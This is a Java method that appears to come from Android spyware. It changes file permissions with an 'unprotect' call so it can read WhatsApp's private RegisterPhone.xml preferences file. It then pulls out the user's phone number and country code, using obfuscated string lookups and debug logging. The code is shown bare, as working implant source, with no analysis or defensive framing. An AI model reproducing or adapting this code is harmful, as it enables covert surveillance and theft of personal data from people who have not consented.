private String readMyPhoneNumber() {
		String myPhone = DEFAULT_LOCAL_NUMBER;
		String myCountryCode = "";

		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
		try {
			Path.unprotect(filename, 2, true);
			File file = new File(filename);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			// Element root = doc.getDocumentElement();
			// root.getElementsByTagName("string");

			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");

			for (int i = 0; i < stringNodes.getLength(); i++) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
				}
				// f_e=com.whatsapp.RegisterPhone.phone_number
				if (item != null && M.e("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
					}
					myPhone = node.getFirstChild().getNodeValue();
				}

				if (item != null && M.e("com.whatsapp.RegisterPhone.country_code").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found country code: " + item);
					}
					myCountryCode = "+" + node.getFirstChild().getNodeValue();
				}
			}

		} catch (Exception e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		}

		return myCountryCode + myPhone;
	}
